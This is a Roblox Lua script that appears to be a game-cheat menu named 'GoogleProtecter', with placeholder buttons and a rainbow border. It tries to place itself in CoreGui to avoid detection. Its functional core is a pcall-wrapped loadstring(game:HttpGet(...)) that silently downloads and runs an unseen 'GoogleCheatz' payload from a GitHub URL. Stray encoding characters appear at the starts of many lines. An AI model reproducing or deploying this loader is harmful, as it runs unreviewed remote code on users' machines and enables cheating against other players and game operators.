local Players = game:GetService("Players")
local CoreGui = game:GetService("CoreGui")
local RunService = game:GetService("RunService")
local HttpService = game:GetService("HttpService")
local UserInputService = game:GetService("UserInputService")
â€‹local LocalPlayer = Players.LocalPlayer
â€‹-- // [2] CONFIGURATION //
local CONFIG = {
Names = {
ScreenGui = "GoogleProtecter",
MainFrame = "MainFrame",
Title = "TitleLabel",
ButtonPrefix = "FeatureButton_"
},
â€‹Size = {
MainFrame = UDim2.new(0, 260, 0, 210),
Button = UDim2.new(0.8, 0, 0, 35),
Title = UDim2.new(1, 0, 0, 20)
},
â€‹Position = {
MainFrame = UDim2.new(0.5, -130, 0.5, -105),
Title = UDim2.new(0, 0, 0, 30)
},
â€‹Colors = {
MainFrame = Color3.fromRGB(15, 15, 30),
TitleText = Color3.new(0, 1, 0.588),
ButtonBackground = Color3.fromRGB(35, 35, 35),
ButtonActive = Color3.new(0, 0.784, 0),
ButtonText = Color3.new(1, 1, 1),
StrokeStart = Color3.new(1, 0, 0)
},
â€‹Buttons = {
{Text = "Stud", Callback = "stud_func"},
{Text = "Remove", Callback = "remove_func"},
{Text = "ON", Callback = "toggle_func"}
}
}
â€‹-- // [3] OBJECT REFERENCES //
local ScreenGui
local MainFrame
local UIStroke
local Buttons = {}
â€‹-- // [4] UTILITY FUNCTIONS //
local function createFeature(index)
print("Feature activated: " .. CONFIG.Buttons[index].Text)
-- Add specific logic for each button here
end
â€‹local function startRainbowStroke()
spawn(function()
local hue = 0
while wait() do
hue = hue + (1/100)
if hue > 1 then hue = 0 end
if UIStroke then
UIStroke.Color = Color3.fromHSV(hue, 1, 1)
end
end
end)
end
â€‹-- // [5] GUI CREATION //
local function createGUI()
-- Base ScreenGui
ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = CONFIG.Names.ScreenGui
-- Try to parent to CoreGui if possible for better protection, fallback to PlayerGui
local success, err = pcall(function() ScreenGui.Parent = CoreGui end)
if not success then ScreenGui.Parent = LocalPlayer:WaitForChild("PlayerGui") end
â€‹-- Main Container
MainFrame = Instance.new("Frame")
MainFrame.Name = CONFIG.Names.MainFrame
MainFrame.Size = CONFIG.Size.MainFrame
MainFrame.Position = CONFIG.Position.MainFrame
MainFrame.BackgroundColor3 = CONFIG.Colors.MainFrame
MainFrame.Active = true
MainFrame.Draggable = true
MainFrame.Parent = ScreenGui
â€‹local Corner = Instance.new("UICorner")
Corner.CornerRadius = UDim.new(0, 14)
Corner.Parent = MainFrame
â€‹UIStroke = Instance.new("UIStroke")
UIStroke.Thickness = 3
UIStroke.Color = CONFIG.Colors.StrokeStart
UIStroke.Parent = MainFrame
â€‹-- Title Label
local Title = Instance.new("TextLabel")
Title.Name = CONFIG.Names.Title
Title.Size = CONFIG.Size.Title
Title.Position = CONFIG.Position.Title
Title.BackgroundTransparency = 1
Title.Text = CONFIG.Names.ScreenGui
Title.TextColor3 = CONFIG.Colors.TitleText
Title.Font = Enum.Font.Arcade
Title.TextScaled = true
Title.Parent = MainFrame
â€‹-- Dynamic Button Generation
for i, btnCfg in ipairs(CONFIG.Buttons) do
local Button = Instance.new("TextButton")
Button.Name = CONFIG.Names.ButtonPrefix .. btnCfg.Text
Button.Size = CONFIG.Size.Button
-- Auto-layout: 35% height start + spacing
Button.Position = UDim2.new(0.1, 0, 0.35 + (i-1)*0.2, 0)
â€‹Button.BackgroundColor3 = (btnCfg.Text == "ON") and CONFIG.Colors.ButtonActive or CONFIG.Colors.ButtonBackground
Button.TextColor3 = CONFIG.Colors.ButtonText
Button.Text = btnCfg.Text
Button.Font = Enum.Font.Arcade
Button.TextScaled = true
Button.Parent = MainFrame
â€‹local BtnCorner = Instance.new("UICorner")
BtnCorner.CornerRadius = UDim.new(0, 10)
BtnCorner.Parent = Button
â€‹Buttons[i] = Button
end
end
â€‹-- // [6] FUNCTIONALITY //
local function initLogic()
-- External Loader Hook
pcall(function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/vanishamir/GoogleProtecter/refs/heads/main/GoogleCheatz'))()
end)
â€‹-- Button Interactions
for i, button in pairs(Buttons) do
button.MouseButton1Click:Connect(function()
createFeature(i)
end)
end
â€‹startRainbowStroke()
end
â€‹-- // [7] INITIALIZATION //
createGUI()
initLogic()
